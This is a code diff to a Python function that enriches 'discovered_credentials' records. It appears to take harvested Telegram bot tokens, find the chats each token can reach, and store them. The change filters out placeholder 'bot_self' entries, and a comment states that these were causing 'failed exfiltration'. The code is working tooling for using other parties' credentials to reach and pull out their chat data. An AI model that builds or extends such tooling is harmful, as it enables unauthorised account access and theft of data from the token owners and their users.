@@ -239,19 +239,24 @@ async def _enrich_logic(cred_id: str):
         logger.error(f"❌ [Enrich] Discovery failed: {e}")
         return f"Discovery failed: {e}"
 
-    if not chats:
-        # Valid token, but no open dialogs.
-        logger.info(f"    [Enrich] No chats via API. Skipping Orphan Match (Disabled).")
+    # Filter out synthetic "bot_self" entries — these are placeholders, not real chats.
+    # discover_chats() inserts them when the token is valid but has no recent activity;
+    # using the bot's own Telegram ID as a chat_id causes failed exfiltration.
+    real_chats = [c for c in chats if c.get("type") != "bot_self"]
+
+    if not real_chats:
+        # Valid token, but no open dialogs (or only bot_self placeholder).
+        logger.info(f"    [Enrich] No real chats via API. Skipping Orphan Match (Disabled).")
         # Mark as 'active' - token works but truly no chats accessible
         await async_execute(db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id))
-        return "Token valid, but no chats found. Status updated to 'active'."
-    
-    # Logic if chats found...
+        return "Token valid, but no real chats found. Status updated to 'active'."
+
+    chats = real_chats
 
     # Update Logic
     # 1. Update the ORIGINAL record with the first chat found.
     # 2. If more chats, create NEW records (clones).
-    
+
     first_chat = chats[0]
     logger.info(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
     
